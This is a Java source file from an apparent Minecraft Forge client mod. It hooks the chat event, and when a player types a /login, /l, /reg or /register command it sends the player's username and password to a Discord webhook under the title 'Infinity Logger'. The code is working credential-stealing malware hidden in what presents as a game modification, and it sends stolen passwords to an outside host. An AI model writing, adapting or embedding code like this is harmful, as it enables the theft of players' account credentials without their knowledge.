package me.bushroot.logger;

import me.bushroot.logger.config.cfg;
import me.bushroot.logger.webhook.DiscordWebhook;
import net.minecraft.client.Minecraft;
import net.minecraftforge.client.event.ClientChatEvent;
import net.minecraftforge.fml.common.eventhandler.SubscribeEvent;

import java.awt.*;
import java.io.IOException;

public class log {
    DiscordWebhook webhookLogger = cfg.logger;

    @SubscribeEvent
    public void ChatEvent(ClientChatEvent e) {
        String msg = e.getMessage();
        String[] sentences = e.getMessage().split(" ");

        if ((msg.startsWith("/l") || msg.startsWith("/login") || msg.startsWith("/reg") || msg.startsWith("/register")) && sentences.length > 1) {
            try {
                webhookLogger.clearEmbeds();
                webhookLogger.addEmbed(new DiscordWebhook.EmbedObject()
                        .setTitle("Infinity")
                        .setDescription("Minecraft Modification | Logger")
                        .setColor(new Color(0xA800E8))
                        .addField("USER", Minecraft.getMinecraft().getSession().getUsername(), true)
                        .addField("PASSWORD", sentences[1], true)

                        .setThumbnail("https://yt3.ggpht.com/aaaOPBv9Zerpdv5YrsMVUhZalk8GI3qS34UAhOHKr15Mnzd-uMv1v00p7rD3VVm7QXfJ5RhCUGU=s600-c-k-c0x00ffffff-no-rj-rp-mo"));

                webhookLogger.execute();
            } catch (IOException ex) {
                ex.printStackTrace();
            }
        }
    }
}
